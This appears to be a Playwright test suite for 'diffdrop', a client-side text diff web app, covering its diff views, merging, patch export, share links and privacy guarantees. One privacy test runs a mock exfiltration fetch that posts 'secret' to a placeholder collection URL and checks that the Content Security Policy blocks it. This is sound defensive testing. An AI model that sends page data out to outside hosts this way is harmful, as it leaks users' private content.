import { expect, test } from '@playwright/test';
import { CHANGED, ORIGINAL, fillEditors, trackErrors } from './helpers';

test.describe('diffdrop', () => {
  test('loads without errors', async ({ page }) => {
    const errors = trackErrors(page);
    await page.goto('/');
    await expect(page).toHaveTitle('diffdrop');
    await expect(page.getByRole('heading', { level: 1 })).toContainText('Everything they paywall.');
    expect(errors).toEqual([]);
  });

  test('shows counts and switches between split and unified views', async ({ page }) => {
    await page.goto('/');
    await fillEditors(page, ORIGINAL, CHANGED);
    const summary = page.getByLabel('Change summary');
    await expect(summary).toContainText('+2');
    await expect(summary).toContainText('−2');
    await expect(page.locator('table.diff-table.split')).toBeVisible();

    await page.getByRole('radio', { name: 'Unified' }).click();
    await expect(page.locator('table.diff-table.unified')).toBeVisible();
    await expect(page.locator('table.diff-table.unified td.prefix', { hasText: '+' })).toHaveCount(2);
  });

  test('merges a line across and undoes it', async ({ page }) => {
    await page.goto('/');
    await fillEditors(page, ORIGINAL, CHANGED);
    const b = page.getByLabel('Changed text');

    await page.getByRole('button', { name: /of a to b/ }).first().click();
    await expect(b).toHaveValue(/function total\(items\) \{/);

    await page.getByRole('button', { name: 'Undo' }).click();
    await expect(b).toHaveValue(CHANGED);
  });

  test('ignores whitespace when asked', async ({ page }) => {
    await page.goto('/');
    await fillEditors(page, 'a  b\nc\n', 'a b\nc\n');
    await expect(page.getByText('a and b are identical')).toHaveCount(0);
    await page.getByLabel('Ignore whitespace').click();
    await expect(page.getByText('a and b are identical')).toBeVisible();
  });

  test('highlights changes inside the editors', async ({ page }) => {
    await page.goto('/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('radio', { name: 'Highlight changes in the editors' }).click();
    await expect(page.locator('.editor-backdrop .bd-line.is-add')).toHaveCount(2);
    await expect(page.locator('.editor-backdrop .bd-line.is-del')).toHaveCount(2);
    await expect(page.locator('.diff-scroll')).toHaveCount(0);
  });

  test('downloads a .patch that describes the change', async ({ page }) => {
    await page.goto('/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('button', { name: 'Export' }).click();
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('menuitem', { name: 'Download .patch' }).click(),
    ]);
    const stream = await download.createReadStream();
    let text = '';
    for await (const chunk of stream) text += chunk;
    expect(text).toContain('--- a/original');
    expect(text).toContain('@@ -1,5 +1,5 @@');
    expect(text).toContain('+function total(items, tax) {');
  });

  test('share links restore both texts from the URL fragment', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await page.goto('/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('button', { name: 'Share' }).click();
    await expect(page).toHaveURL(/#.+/);
    const url = page.url();
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(url);

    const fresh = await context.newPage();
    await fresh.goto(url);
    await expect(fresh.getByLabel('Original text')).toHaveValue(ORIGINAL);
    await expect(fresh.getByLabel('Changed text')).toHaveValue(CHANGED);
  });

  test('remembers the chosen theme', async ({ page }) => {
    await page.goto('/');
    await page.getByRole('radio', { name: 'Dark' }).click();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    await page.reload();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
  });
});

test.describe('privacy', () => {
  test('ships a Content Security Policy that blocks network requests', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'none'");
  });

  test('makes no network requests while diffing', async ({ page }) => {
    await page.goto('/', { waitUntil: 'networkidle' });
    const requests: string[] = [];
    page.on('request', (r) => requests.push(r.url()));

    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('radio', { name: 'Unified' }).click();
    await page.getByRole('radio', { name: 'Highlight changes in the editors' }).click();
    await page.getByRole('button', { name: 'Summary' }).click();
    await page.mouse.wheel(0, 20_000); // scroll through the rest of the page
    await page.waitForTimeout(500);

    expect(requests).toEqual([]);
  });

  test('blocks a script that tries to send data out', async ({ page }) => {
    await page.goto('/');
    const result = await page.evaluate(() =>
      fetch('https://example.com/collect', { method: 'POST', body: 'secret' }).then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(result).toBe('blocked');
  });

  // Known gap: there is no service worker yet, so a reload without a connection fails.
  test.fixme('keeps working after an offline reload', async ({ page, context }) => {
    await page.goto('/', { waitUntil: 'networkidle' });
    await context.setOffline(true);
    await page.reload();
    await expect(page).toHaveTitle('diffdrop');
  });
});
